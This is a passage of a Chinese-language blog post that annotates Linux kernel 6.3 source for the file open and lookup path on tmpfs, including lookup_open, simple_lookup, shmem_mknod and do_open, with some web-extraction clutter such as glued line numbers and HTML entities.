lookup, we actually * want to exit RCU lookup anyway. * * Note that raw_seqcount_begin still *does* smp_rmb(), so * we are still guaranteed NUL-termination of -&gt;d_name.name. */ seq = raw_seqcount_begin(&amp;dentry-&gt;d_seq); // 获取 dentry 的序列计数 if (dentry-&gt;d_parent != parent) // 检查 dentry 的父目录项是否与给定的父目录项相同 continue; if (d_unhashed(dentry)) // 检查 dentry 是否已从散列表中删除 continue; if (dentry-&gt;d_name.hash_len != hashlen) // 检查 dentry 的名称哈希长度是否与给定名称相同 continue; if (dentry_cmp(dentry, str, hashlen_len(hashlen)) != 0) // 比较 dentry 的名称与给定名称是否相同 continue; *seqp = seq; // 将序列计数赋值给 seqp return dentry; // 返回找到的 dentry &#125; return NULL; // 如果没有找到匹配的 dentry，则返回空指针&#125; __d_lookup_rcu 函数在给定的父目录项下查找具有给定名称的目录项（dentry）。它使用 RCU（读-拷贝-更新）机制遍历散列表，以便在遍历过程中保护数据结构。如果找到匹配的目录项，它将返回指向该目录项的指针，否则返回 NULL。 hlist_bl_for_each_entry_rcu1234567891011121314151617/** * hlist_bl_for_each_entry_rcu - iterate over rcu list of given type * @tpos: the type * to use as a loop cursor. * @pos: the &amp;struct hlist_bl_node to use as a loop cursor. * @head: the head for your list. * @member: the name of the hlist_bl_node within the struct. * */#define hlist_bl_for_each_entry_rcu(tpos, pos, head, member) \\ // 初始化 pos 为列表头的第一个元素 for (pos = hlist_bl_first_rcu(head); \\ // 当 pos 不为 NULL 时执行循环体内的代码 pos &amp;&amp; \\ // 使用宏 hlist_bl_entry 获取当前 pos 对应的结构体类型的指针，并赋值给 tpos (&#123; tpos = hlist_bl_entry(pos, typeof(*tpos), member); 1; &#125;); \\ // 更新 pos 为下一个元素，使用 rcu_dereference_raw 进行 RCU 解引用 pos = rcu_dereference_raw(pos-&gt;next)) 这个宏定义了一个 for 循环，用于遍历链表中的每个元素。在循环体内，它使用 hlist_bl_entry 宏获取当前 pos 对应的结构体类型的指针，并将其赋值给 tpos。循环将持续进行，直到遍历完链表。在每次迭代时，它都会使用 rcu_dereference_raw 函数对 pos-&gt;next 进行 RCU 解引用以获取下一个元素。 lookup_slowlookup_slow identifier - Linux source code (v6.3.7) - Bootlin 12345678910111213141516171819static struct dentry *lookup_slow(const struct qstr *name, struct dentry *dir, unsigned int flags)&#123; struct inode *inode = dir-&gt;d_inode; // 获取给定目录项（dir）对应的 inode struct dentry *res; // 定义一个目录项指针，用于存储查找结果 // 对 inode 上的共享锁进行加锁，以保护查找过程中的数据结构 inode_lock_shared(inode); // 调用 __lookup_slow 函数在给定目录项（dir）下查找与给定名称（name）匹配的目录项 res = __lookup_slow(name, dir, flags); // 对 inode 上的共享锁进行解锁 inode_unlock_shared(inode); // 返回查找到的目录项（dentry），如果没有找到匹配的项，返回 NULL return res;&#125; __lookup_slow函数__lookup_slow identifier - Linux source code (v6.3.7) - Bootlin 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647/* Fast lookup failed, do it the slow way */static struct dentry *__lookup_slow(const struct qstr *name, struct dentry *dir, unsigned int flags)&#123; struct dentry *dentry, *old; struct inode *inode = dir-&gt;d_inode; // 获取给定目录项（dir）对应的 inode DECLARE_WAIT_QUEUE_HEAD_ONSTACK(wq); // 定义一个等待队列头变量 // 如果 inode 已经是死亡状态，直接返回错误 if (unlikely(IS_DEADDIR(inode))) return ERR_PTR(-ENOENT);again: // 分配一个新的 dentry，如果需要等待，则使用 wq 等待 dentry = d_alloc_parallel(dir, name, &amp;wq); if (IS_ERR(dentry)) return dentry; // 如果 dentry 不处于查找状态 if (unlikely(!d_in_lookup(dentry))) &#123; // 重新验证 dentry int error = d_revalidate(dentry, flags); if (unlikely(error &lt;= 0)) &#123; // 如果验证失败，使 dentry 无效，释放 dentry，并重新尝试 if (!error) &#123; d_invalidate(dentry); dput(dentry); goto again; &#125; // 释放 dentry，并返回错误 dput(dentry); dentry = ERR_PTR(error); &#125; &#125; else &#123; // 调用文件系统特定的 lookup 函数查找 dentry old = inode-&gt;i_op-&gt;lookup(inode, dentry, flags); d_lookup_done(dentry); // 完成查找操作 if (unlikely(old)) &#123; // 如果找到旧的 dentry，释放新分配的 dentry，并使用旧的 dentry dput(dentry); dentry = old; &#125; &#125; // 返回查找到的 dentry 或新创建的 dentry return dentry;&#125; __lookup_slow 函数在给定的目录项（dir）下查找具有给定名称（name）的目录项（dentry）。此函数在快速查找失败的情况下使用慢速查找方法。首先，它获取给定目录项（dir）对应的 inode，然后分配一个新的 dentry。接着检查 dentry 是否处于查找状态，如果不是，则重新验证 dentry。如果验证失败，则使 dentry 无效并释放它，然后重新尝试。如果 dentry 处于查找状态，则调用文件系统特定的 lookup 函数查找 dentry。完成查找后，如果找到旧的 dentry，则释放新分配的 dentry 并使用旧的 dentry。最后，返回找到的或新创建的 dentry。 当查找成功时，__lookup_slow 函数返回找到的 dentry。如果没有找到匹配的目录项，inode-&gt;i_op-&gt;lookup 函数将创建一个新的目录项并返回它。创建新目录项的过程依赖于具体的文件系统实现，通常涉及分配一个新的 dentry 结构，并将其与给定的 name 和父目录项关联起来。 inode-&gt;i_op-&gt;lookup函数指向 simple_lookup() 函数首先我们参考上文中的get_tree函数是如何被设置为shmem_init函数 可以了解到内核在启动时会初始化tmpfs文件系统 我们根据调用链shmem_get_tree - shmem_fill_super - shmem_get_inode，然后查看shmem_get_inode函数 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576static struct inode *shmem_get_inode(struct mnt_idmap *idmap, struct super_block *sb, struct inode *dir, umode_t mode, dev_t dev, unsigned long flags)&#123; struct inode *inode; struct shmem_inode_info *info; struct shmem_sb_info *sbinfo = SHMEM_SB(sb); ino_t ino; // 为新的inode预留一个系统内部的编号 if (shmem_reserve_inode(sb, &amp;ino)) return NULL; // 为新的inode分配内存 inode = new_inode(sb); if (inode) &#123; // 设置inode的编号 inode-&gt;i_ino = ino; // 初始化inode的所有者和权限模式 inode_init_owner(idmap, inode, dir, mode); // 设置inode的磁盘块数为0 inode-&gt;i_blocks = 0; // 设置inode的访问、修改和创建时间 inode-&gt;i_atime = inode-&gt;i_mtime = inode-&gt;i_ctime = current_time(inode); // 设置inode的生成编号（用于NFS） inode-&gt;i_generation = get_random_u32(); // 获得shmem_inode_info结构（tmpfs专用） info = SHMEM_I(inode); // 初始化shmem_inode_info结构 memset(info, 0, (char *)inode - (char *)info); spin_lock_init(&amp;info-&gt;lock); atomic_set(&amp;info-&gt;stop_eviction, 0); info-&gt;seals = F_SEAL_SEAL; info-&gt;flags = flags &amp; VM_NORESERVE; info-&gt;i_crtime = inode-&gt;i_mtime; info-&gt;fsflags = (dir == NULL) ? 0 : SHMEM_I(dir)-&gt;fsflags &amp; SHMEM_FL_INHERITED; if (info-&gt;fsflags) shmem_set_inode_flags(inode, info-&gt;fsflags); INIT_LIST_HEAD(&amp;info-&gt;shrinklist); INIT_LIST_HEAD(&amp;info-&gt;swaplist); simple_xattrs_init(&amp;info-&gt;xattrs); cache_no_acl(inode); mapping_set_large_folios(inode-&gt;i_mapping); // 根据不同的文件类型，设置相应的操作函数 switch (mode &amp; S_IFMT) &#123; default: inode-&gt;i_op = &amp;shmem_special_inode_operations; init_special_inode(inode, mode, dev); break; case S_IFREG: inode-&gt;i_mapping-&gt;a_ops = &amp;shmem_aops; inode-&gt;i_op = &amp;shmem_inode_operations; inode-&gt;i_fop = &amp;shmem_file_operations; mpol_shared_policy_init(&amp;info-&gt;policy, shmem_get_sbmpol(sbinfo)); break; case S_IFDIR: inc_nlink(inode); inode-&gt;i_size = 2 * BOGO_DIRENT_SIZE; inode-&gt;i_op = &amp;shmem_dir_inode_operations; inode-&gt;i_fop = &amp;simple_dir_operations; break; case S_IFLNK: mpol_shared_policy_init(&amp;info-&gt;policy, NULL); break; &#125; // 为锁依赖分析系统设置inode互斥锁的标记 lockdep_annotate_inode_mutex_key(inode); &#125; else // 如果inode分配失败，则释放预留的编号 shmem_free_inode(sb); return inode;&#125; 设置文件类型为目录类型 所以inode-&gt;i_op = &amp;shmem_dir_inode_operations; 查看这个变量的定义 shmem_dir_inode_operations identifier - Linux source code (v6.3.6) - Bootlin 123456789101112131415161718192021222324static const struct inode_operations shmem_dir_inode_operations = &#123;#ifdef CONFIG_TMPFS .getattr = shmem_getattr, .create = shmem_create, .lookup = simple_lookup,//这里定义了lookup函数 .link = shmem_link, .unlink = shmem_unlink, .symlink = shmem_symlink, .mkdir = shmem_mkdir, .rmdir = shmem_rmdir, .mknod = shmem_mknod, .rename = shmem_rename2, .tmpfile = shmem_tmpfile,#endif#ifdef CONFIG_TMPFS_XATTR .listxattr = shmem_listxattr, .fileattr_get = shmem_fileattr_get, .fileattr_set = shmem_fileattr_set,#endif#ifdef CONFIG_TMPFS_POSIX_ACL .setattr = shmem_setattr, .set_acl = simple_set_acl,#endif&#125;; lookup函数被设置为了simple_lookup simple_lookup identifier - Linux source code (v6.3.6) - Bootlin 1234567891011121314151617181920212223242526272829/* * 查找数据。这很简单 - 如果 dentry 不存在， * 我们知道它是负的。设置 d_op 以删除负 dentries。 */// 定义 simple_lookup 函数，它接受一个指向 inode 的指针，// 一个指向 dentry 的指针，以及一个无符号整数作为标志作为参数。struct dentry *simple_lookup(struct inode *dir, struct dentry *dentry, unsigned int flags)&#123; // 检查 dentry 名称的长度是否大于允许的最大值（NAME_MAX）。 // 如果是，则返回带有 -ENAMETOOLONG 的错误指针。 if (dentry-&gt;d_name.len &gt; NAME_MAX) return ERR_PTR(-ENAMETOOLONG); // 如果 dentry 的超级块 d_op 字段为 NULL， // 将其设置为 simple_dentry_operations。 if (!dentry-&gt;d_sb-&gt;s_d_op) d_set_d_op(dentry, &amp;simple_dentry_operations); // 将 dentry 添加到 dcache 中，使用 NULL inode， // 表示负 dentry（即，文件不存在）。 d_add(dentry, NULL); // 返回 NULL，表示查找已完成。 return NULL;&#125;// 导出 simple_lookup 符号，使其可供其他模块使用。EXPORT_SYMBOL(simple_lookup); 如果没有找到文件，simple_lookup会返回NULL，并且 12if (!dentry-&gt;d_sb-&gt;s_d_op) d_set_d_op(dentry, &amp;simple_dentry_operations); 这段代码将d_op设置为simple_dentry_operations 然后调用d_add添加一个负dentry(NULL inode),表示文件不存在。 open_last_lookups函数open_last_lookups identifier - Linux source code (v6.3.7) - Bootlin 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586static const char *open_last_lookups(struct nameidata *nd, struct file *file, const struct open_flags *op)&#123; struct dentry *dir = nd-&gt;path.dentry; // 获取路径对应的 dentry int open_flag = op-&gt;open_flag; // 获取文件打开标志 bool got_write = false; // 标记是否获取到写权限 struct dentry *dentry; const char *res; nd-&gt;flags |= op-&gt;intent; // 更新 nd 的标志，将 op-&gt;intent 合并到 nd-&gt;flags 中 // 处理不是普通类型的路径分量（如 &#x27;..&#x27;, &#x27;.&#x27;） if (nd-&gt;last_type != LAST_NORM) &#123; if (nd-&gt;depth) put_link(nd); // 如果 nd-&gt;depth 不为 0，释放符号链接 return handle_dots(nd, nd-&gt;last_type); // 处理 &#x27;.&#x27; 和 &#x27;..&#x27; 路径分量 &#125; // 如果未设置 O_CREAT，尝试在 RCU 模式下快速查找目录项 if (!(open_flag &amp; O_CREAT)) &#123; if (nd-&gt;last.name[nd-&gt;last.len]) nd-&gt;flags |= LOOKUP_FOLLOW | LOOKUP_DIRECTORY; dentry = lookup_fast(nd); // 快速查找目录项 if (IS_ERR(dentry)) return ERR_CAST(dentry); // 如果出错，返回错误指针 if (likely(dentry)) goto finish_lookup; BUG_ON(nd-&gt;flags &amp; LOOKUP_RCU); &#125; else &#123; // 对于 O_CREAT 标志的处理 // 如果当前处于 RCU 模式，则尝试从 RCU 模式切换到非 RCU 模式 if (nd-&gt;flags &amp; LOOKUP_RCU) &#123; if (!try_to_unlazy(nd)) return ERR_PTR(-ECHILD); &#125; audit_inode(nd-&gt;name, dir, AUDIT_INODE_PARENT); // 审计相关操作 // 检查路径名是否有尾随的 &#x27;/&#x27; if (unlikely(nd-&gt;last.name[nd-&gt;last.len])) return ERR_PTR(-EISDIR); &#125; // 检查是否需要获取写权限 if (open_flag &amp; (O_CREAT | O_TRUNC | O_WRONLY | O_RDWR)) &#123; got_write = !mnt_want_write(nd-&gt;path.mnt); &#125; // 如果设置了 O_CREAT，对目录 inode 上锁；否则，对目录 inode 加共享锁 if (open_flag &amp; O_CREAT) inode_lock(dir-&gt;d_inode); else inode_lock_shared(dir-&gt;d_inode); // 调用 lookup_open 函数进行打开或创建操作 dentry = lookup_open(nd, file, op, got_write); // 如果成功创建新文件，通知相关子系统 if (!IS_ERR(dentry) &amp;&amp; (file-&gt;f_mode &amp; FMODE_CREATED)) fsnotify_create(dir-&gt;d_inode, dentry); // 解锁目录 inode if (open_flag &amp; O_CREAT) inode_unlock(dir-&gt;d_inode); else inode_unlock_shared(dir-&gt;d_inode); // 如果已获取写权限，释放对挂载点的写权限 if (got_write) mnt_drop_write(nd-&gt;path.mnt); if (IS_ERR(dentry)) return ERR_CAST(dentry); // 如果出错，返回错误指针 // 如果文件已打开或创建，更新 nd-&gt;path if (file-&gt;f_mode &amp; (FMODE_OPENED | FMODE_CREATED)) &#123; dput(nd-&gt;path.dentry); nd-&gt;path.dentry = dentry; return NULL; &#125;finish_lookup: // 结束查找，释放符号链接并进入下一个路径分量 if (nd-&gt;depth) put_link(nd); res = step_into(nd, WALK_TRAILING, dentry); if (unlikely(res)) nd-&gt;flags &amp;= ~(LOOKUP_OPEN|LOOKUP_CREATE|LOOKUP_EXCL); return res;&#125; lookup_open函数lookup_open identifier - Linux source code (v6.3.7) - Bootlin 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148// 定义 lookup_open 函数，参数包括：一个指向 nameidata 结构体的指针、一个指向 file 结构体的指针、一个指向 open_flags 结构体的指针，以及一个表示是否获得写权限的布尔值static struct dentry *lookup_open(struct nameidata *nd, struct file *file, const struct open_flags *op, bool got_write)&#123; // 定义一个指向 mnt_idmap 结构体的指针 struct mnt_idmap *idmap; // 定义一个指向当前目录 dentry 结构体的指针 struct dentry *dir = nd-&gt;path.dentry; // 定义一个指向当前目录 inode 结构体的指针 struct inode *dir_inode = dir-&gt;d_inode; // 定义一个整数变量，存储打开文件的标志 int open_flag = op-&gt;open_flag; // 定义一个指向最终要打开或创建的目录项的 dentry 结构体的指针 struct dentry *dentry; // 定义两个整数变量，分别用于存储错误码和创建错误码 int error, create_error = 0; // 定义一个无符号整数变量，存储文件模式 umode_t mode = op-&gt;mode; // 声明一个等待队列头并初始化为栈上变量 DECLARE_WAIT_QUEUE_HEAD_ONSTACK(wq); // 如果当前目录已死，返回 -ENOENT 错误 if (unlikely(IS_DEADDIR(dir_inode))) return ERR_PTR(-ENOENT); // 清除文件结构体的创建模式标志 file-&gt;f_mode &amp;= ~FMODE_CREATED; // 查找当前目录是否包含要打开或创建的目录项 dentry = d_lookup(dir, &amp;nd-&gt;last); // 使用一个循环来处理目录项查找和验证 for (;;) &#123; // 如果目录项为空，进行并行分配 if (!dentry) &#123; dentry = d_alloc_parallel(dir, &amp;nd-&gt;last, &amp;wq); // 如果分配失败，返回错误 if (IS_ERR(dentry)) return dentry; &#125; // 如果目录项还在查找中，跳出循环 if (d_in_lookup(dentry)) break; // 验证目录项 error = d_revalidate(dentry, nd-&gt;flags); // 如果验证成功，跳出循环 if (likely(error &gt; 0)) break; // 如果验证失败，处理错误 if (error) goto out_dput; // 使目录项失效 d_invalidate(dentry); // 释放目录项 dput(dentry); // 将目录项置为空 dentry = NULL; &#125; // 如果目录项的 inode 不为空，表示找到了正 dentry，将在 f_op-&gt;open 中打开 if (dentry-&gt;d_inode) &#123; return dentry; &#125; // 检查写权限 if (unlikely(!got_write)) open_flag &amp;= ~O_TRUNC; // 获取文件系统的 ID 映射 idmap = mnt_idmap(nd-&gt;path.mnt); // 如果需要创建文件 if (open_flag &amp; O_CREAT) &#123; // 确保 O_EXCL 和 O_TRUNC 不同时设置 if (open_flag &amp; O_EXCL) open_flag &amp;= ~O_TRUNC; // 准备文件模式 mode = vfs_prepare_mode(idmap, dir-&gt;d_inode, mode, mode, mode); // 检查是否具有创建权限 if (likely(got_write)) create_error = may_o_create(idmap, &amp;nd-&gt;path, dentry, mode); else create_error = -EROFS; &#125; // 如果创建失败，清除 O_CREAT 标志 if (create_error) open_flag &amp;= ~O_CREAT; // 如果支持原子打开操作 if (dir_inode-&gt;i_op-&gt;atomic_open) &#123; // 执行原子打开操作 dentry = atomic_open(nd, dentry, file, open_flag, mode); // 如果创建失败，返回创建错误 if (unlikely(create_error) &amp;&amp; dentry == ERR_PTR(-ENOENT)) dentry = ERR_PTR(create_error); return dentry; &#125; // 如果目录项仍在查找中 if (d_in_lookup(dentry)) &#123; // 执行查找操作3 struct dentry *res = dir_inode-&gt;i_op-&gt;lookup(dir_inode, dentry, nd-&gt;flags); // 标记查找完成 d_lookup_done(dentry); // 如果查找结果不为空 if (unlikely(res)) &#123; // 如果查找结果为错误，处理错误 if (IS_ERR(res)) &#123; error = PTR_ERR(res); goto out_dput; &#125; // 释放旧的目录项，将结果赋给目录项 dput(dentry); dentry = res; &#125; &#125; // 如果目录项的 inode 为空并且需要创建文件 if (!dentry-&gt;d_inode &amp;&amp; (open_flag &amp; O_CREAT)) &#123; // 设置文件结构体的创建模式标志 file-&gt;f_mode |= FMODE_CREATED; // 记录创建子节点的审计事件 audit_inode_child(dir_inode, dentry, AUDIT_TYPE_CHILD_CREATE); // 如果没有创建操作，返回错误 if (!dir_inode-&gt;i_op-&gt;create) &#123; error = -EACCES; goto out_dput; &#125; // 创建新文件的关键代码 error = dir_inode-&gt;i_op-&gt;create(idmap, dir_inode, dentry, mode, open_flag &amp; O_EXCL); // 如果创建失败，处理错误 if (error) goto out_dput; &#125; // 如果创建失败且目录项的 inode 仍为空，返回错误 if (unlikely(create_error) &amp;&amp; !dentry-&gt;d_inode) &#123; error = create_error; goto out_dput; &#125; // 返回目录项 return dentry;// 处理释放目录项的错误情况out_dput: dput(dentry); // 返回错误指针 return ERR_PTR(error);&#125; 1234567891011121314151617181920212223242526272829303132333435363738394041424344// 定义 d_alloc_parallel 函数，输入参数包括父目录项 parent、目录项名字 name 和等待队列头 wqstruct dentry *d_alloc_parallel(struct dentry *parent, const struct qstr *name, wait_queue_head_t *wq)&#123; // 计算名字的哈希值 unsigned int hash = name-&gt;hash; // 计算哈希值对应的哈希链表头 struct hlist_bl_head *b = in_lookup_hash(parent, hash); // 声明哈希链表节点 struct hlist_bl_node *node; // 分配一个新的目录项 struct dentry *new = d_alloc(parent, name); // 声明一个目录项变量 struct dentry *dentry; // 声明序列号变量 unsigned seq, r_seq, d_seq; // 如果新分配的目录项为空，返回错误 if (unlikely(!new)) return ERR_PTR(-ENOMEM); // 使用一个循环来处理目录项查找和验证 retry: // 开启 RCU 读锁 rcu_read_lock(); // 获取父目录项的序列号 seq = smp_load_acquire(&amp;parent-&gt;d_inode-&gt;i_dir_seq); // 获取重命名锁的序列号 r_seq = read_seqbegin(&amp;rename_lock); // 在 RCU 保护下查找目录项 dentry = __d_lookup_rcu(parent, name, &amp;d_seq); // 如果目录项存在 if (unlikely(dentry)) &#123; // 尝试获取目录项的引用，如果失败则重试 if (!lockref_get_not_dead(&amp;dentry-&gt;d_lockref)) &#123; rcu_read_unlock(); goto retry; &#125; // 检查目录项的序列号是否发生变化，如果发生变化则释放目录项并重试 if (read_seqcount_retry(&amp;dentry-&gt;d_seq, d_seq)) &#123; rcu_read_unlock(); dput(dentry); goto retry; 123456789101112131415161718192021222324252627282930/** * d_lookup - 搜索一个dentry * @parent: 父dentry * @name: 我们要查找的名字的qstr * 返回: dentry，或者NULL * * d_lookup在父dentry的子项中搜索指定的名字。 * 如果找到了dentry，它的引用计数会递增，并返回该dentry。 * 调用者在使用完毕后必须使用dput来释放该项。如果dentry不存在，返回%NULL。 */struct dentry *d_lookup(const struct dentry *parent, const struct qstr *name)&#123; struct dentry *dentry; unsigned seq; // 使用循环，知道满足条件退出 do &#123; // 读取重命名锁的序列号 seq = read_seqbegin(&amp;rename_lock); // 在父dentry的子项中查找名字 dentry = __d_lookup(parent, name); // 如果找到了dentry，跳出循环 if (dentry) break; // 如果重命名锁的序列号发生变化，重试 &#125; while (read_seqretry(&amp;rename_lock, seq)); // 返回找到的dentry，如果没有找到则返回NULL return dentry;&#125;EXPORT_SYMBOL(d_lookup); // 导出d_lookup符号，供其他模块使用 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273/** * __d_lookup - 搜索一个dentry（有竞争风险） * @parent: 父dentry * @name: 我们要查找的名字的qstr * 返回: dentry，或者NULL * * __d_lookup类似于d_lookup，然而由于无关的重命名活动，它可能（较少情况下）返回一个 * 错误的负面结果。 * * __d_lookup通过避免读取rename_lock seqlock而略微更快，但是必须谨慎使用，例如在失败时 * 使用后续的d_lookup。 * * __d_lookup调用者必须进行注释。 */struct dentry *__d_lookup(const struct dentry *parent, const struct qstr *name)&#123; unsigned int hash = name-&gt;hash; struct hlist_bl_head *b = d_hash(hash); struct hlist_bl_node *node; struct dentry *found = NULL; struct dentry *dentry; /* * 注意：与__d_lookup_rcu有很大的重复，这是为了防止单线程性能退化 * 尤其是在smp_rmb（在seqcounts中）代价高昂的体系结构上。 * 保持两个函数同步。 */ /* * 哈希列表使用RCU进行保护。 * * 在比较候选dentry时获取d_lock，以避免与d_move()的竞争。 * * 可能的是，同时发生的重命名可能会破坏我们这里的列表遍历， * 并导致我们的dentry丢失，从而导致错误的负面结果。 * d_lookup()使用rename_lock seqlock保护免受同时进行的重命名影响。 * * 有关详细信息，请参阅Documentation/filesystems/path-lookup.txt。 */ rcu_read_lock(); // 使用RCU遍历哈希列表的每个条目 hlist_bl_for_each_entry_rcu(dentry, node, b, d_hash) &#123; if (dentry-&gt;d_name.hash != hash) continue; // 获取dentry的锁，避免竞争 spin_lock(&amp;dentry-&gt;d_lock); if (dentry-&gt;d_parent != parent) goto next; if (d_unhashed(dentry)) goto next; // 检查dentry的名字是否与给定的名字匹配 if (!d_same_name(dentry, parent, name)) goto next; // 增加dentry的引用计数 dentry-&gt;d_lockref.count++; found = dentry; // 解锁dentry的锁 spin_unlock(&amp;dentry-&gt;d_lock); break;next: spin_unlock(&amp;dentry-&gt;d_lock); &#125; rcu_read_unlock(); // 返回找到的dentry，如果没有找到则返回NULL return found;&#125; dir_inode-&gt;i_op-&gt;create指向shmem_create函数参考上文中的inode-&gt;i_op-&gt;lookup函数指向simple_lookup() 12345678910111213141516171819202122232425static const struct inode_operations shmem_dir_inode_operations = &#123;#ifdef CONFIG_TMPFS .getattr = shmem_getattr, .create = shmem_create,//这里定义了create函数 .lookup = simple_lookup,//这里定义了lookup函数 .link = shmem_link, .unlink = shmem_unlink, .symlink = shmem_symlink, .mkdir = shmem_mkdir, .rmdir = shmem_rmdir, .mknod = shmem_mknod, .rename = shmem_rename2, .tmpfile = shmem_tmpfile,#endif#ifdef CONFIG_TMPFS_XATTR .listxattr = shmem_listxattr, .fileattr_get = shmem_fileattr_get, .fileattr_set = shmem_fileattr_set,#endif#ifdef CONFIG_TMPFS_POSIX_ACL .setattr = shmem_setattr, .set_acl = simple_set_acl,#endif&#125;;_setattr,&#125;; 可以看到这个结构体中.create = shmem_create，我们再细看shmem_create函数 shmem_create identifier - Linux source code (v6.3.6) - Bootlin 12345static int shmem_create(struct mnt_idmap *idmap, struct inode *dir, struct dentry *dentry, umode_t mode, bool excl)&#123; return shmem_mknod(idmap, dir, dentry, mode | S_IFREG, 0);&#125; shmem_mknod函数shmem_mknod identifier - Linux source code (v6.3.6) - Bootlin 123456789101112131415161718192021222324252627282930313233343536373839404142static intshmem_mknod(struct mnt_idmap *idmap, struct inode *dir, struct dentry *dentry, umode_t mode, dev_t dev)&#123; struct inode *inode; // 用于存储新创建的 inode int error = -ENOSPC; // 初始化错误码为 -ENOSPC（没有空间可用） // 从共享内存文件系统获取新的 inode inode = shmem_get_inode(idmap, dir-&gt;i_sb, dir, mode, dev, VM_NORESERVE); if (inode) &#123; // 如果成功获取 inode // 创建简单 ACL（访问控制列表） error = simple_acl_create(dir, inode); if (error) // 如果创建失败，跳转到 out_iput 标签 goto out_iput; // 初始化 inode 安全属性 error = security_inode_init_security(inode, dir, &amp;dentry-&gt;d_name, shmem_initxattrs, NULL); // 如果初始化失败且错误码不是 -EOPNOTSUPP，跳转到 out_iput 标签 if (error &amp;&amp; error != -EOPNOTSUPP) goto out_iput; // 至此，文件创建成功，将错误码置为 0 error = 0; // 更新目录 inode 大小 dir-&gt;i_size += BOGO_DIRENT_SIZE; // 更新目录 inode 访问和修改时间 dir-&gt;i_ctime = dir-&gt;i_mtime = current_time(dir); // 递增目录 inode 的 i_version inode_inc_iversion(dir); // 将新创建的 inode 与 dentry 关联 d_instantiate(dentry, inode); // 增加 dentry 引用计数 dget(dentry); /* Extra count - pin the dentry in core */ &#125; return error; // 返回错误码out_iput: // 处理创建过程中的错误 iput(inode); // 释放 inode return error; // 返回错误码&#125; do_open函数do_open identifier - Linux source code (v6.3.7) - Bootlin 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687/* * 处理 open() 的最后一步 */static int do_open(struct nameidata *nd, struct file *file, const struct open_flags *op)&#123; struct mnt_idmap *idmap; int open_flag = op-&gt;open_flag; bool do_truncate; int acc_mode; int error; // 如果文件未被打开或创建，完成路径名解析 if (!(file-&gt;f_mode &amp; (FMODE_OPENED | FMODE_CREATED))) &#123; error = complete_walk(nd); if (error) return error; &#125; // 如果文件未被创建，进行审计处理 if (!(file-&gt;f_mode &amp; FMODE_CREATED)) audit_inode(nd-&gt;name, nd-&gt;path.dentry, 0); // 获取文件系统 ID 映射 idmap = mnt_idmap(nd-&gt;path.mnt); // 处理 O_CREAT 标志 if (open_flag &amp; O_CREAT) &#123; // 如果设置了 O_EXCL 标志且文件未被创建，返回错误 if ((open_flag &amp; O_EXCL) &amp;&amp; !(file-&gt;f_mode &amp; FMODE_CREATED)) return -EEXIST; // 如果目标是目录，返回错误 if (d_is_dir(nd-&gt;path.dentry)) return -EISDIR; // 检查是否有权限在粘滞位目录中创建文件 error = may_create_in_sticky(idmap, nd, d_backing_inode(nd-&gt;path.dentry)); if (unlikely(error)) return error; &#125; // 检查目标是否是目录 if ((nd-&gt;flags &amp; LOOKUP_DIRECTORY) &amp;&amp; !d_can_lookup(nd-&gt;path.dentry)) return -ENOTDIR; // 初始化 do_truncate 和 acc_mode do_truncate = false; acc_mode = op-&gt;acc_mode; // 如果文件已被创建，跳过写权限检查和截断操作 if (file-&gt;f_mode &amp; FMODE_CREATED) &#123; open_flag &amp;= ~O_TRUNC; acc_mode = 0; &#125; else if (d_is_reg(nd-&gt;path.dentry) &amp;&amp; open_flag &amp; O_TRUNC) &#123; // 如果目标是普通文件且设置了 O_TRUNC 标志，检查写权限 error = mnt_want_write(nd-&gt;path.mnt); if (error) return error; do_truncate = true; &#125; // 检查是否有权限打开文件 error = may_open(idmap, &amp;nd-&gt;path, acc_mode, open_flag); // 如果没有错误且文件未被打开，调用 vfs_open 打开文件 if (!error &amp;&amp; !(file-&gt;f_mode &amp; FMODE_OPENED)) error = vfs_open(&amp;nd-&gt;path, file); // 对文件执行 IMA 审计 if (!error) error = ima_file_check(file, op-&gt;acc_mode); // 如果需要截断，执行截断操作 if (!error &amp;&amp; do_truncate) error = handle_truncate(idmap, file); // 如果错误码大于 0，输出警告并设置错误码为 -EINVAL if (unlikely(error &gt; 0)) &#123; WARN_ON(1); error = -EINVAL; &#125; // 如果进行了截断操作，释放写权限 if (do_truncate) mnt_drop_write(nd-&gt;path.mnt); return error;&#125; vfs_open函数vfs_open identifier - Linux source code (v6.3.7) - Bootlin 1234567891011121314/** * vfs_open - 打开给定路径的文件 * @path: 要打开的路径 * @file: 新分配的文件，已初始化 f_flag */int vfs_open(const struct path *path, struct file *file)&#123; // 将文件的路径设置为给定路径 file-&gt;f_path = *path; // 调用 do_dentry_open() 函数打开文件 // 这里传递 NULL 作为 open() 函数的第三个参数，因为在 tmpfs 中，不需要特定的打开操作 return do_dentry_open(file, d_backing_inode(path-&gt;dentry), NULL);&#125; do_dentry_open函数do_dentry_open identifier - Linux source code (v6.3.7) - Bootlin 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137static int do_dentry_open(struct file *f, struct inode *inode, int (*open)(struct inode *, struct file *))&#123; // 声明一个空的文件操作结构 static const struct file_operations empty_fops = &#123;&#125;; int error; // 增加路径的引用计数 path_get(&amp;f-&gt;f_path); // 设置文件的 inode f-&gt;f_inode = inode; // 设置文件的地址空间（映射） f-&gt;f_mapping = inode-&gt;i_mapping; // 从文件的地址空间中获取写回错误样本 f-&gt;f_wb_err = filemap_sample_wb_err(f-&gt;f_mapping); // 从文件中获取超级块错误样本 f-&gt;f_sb_err = file_sample_sb_err(f); // 检查文件是否以 O_PATH 标志打开，如果是，则设置文件模式和操作 if (unlikely(f-&gt;f_flags &amp; O_PATH)) &#123; f-&gt;f_mode = FMODE_PATH | FMODE_OPENED; f-&gt;f_op = &amp;empty_fops; return 0; &#125; // 如果文件以读模式打开，增加读取计数 if ((f-&gt;f_mode &amp; (FMODE_READ | FMODE_WRITE)) == FMODE_READ) &#123; i_readcount_inc(inode); 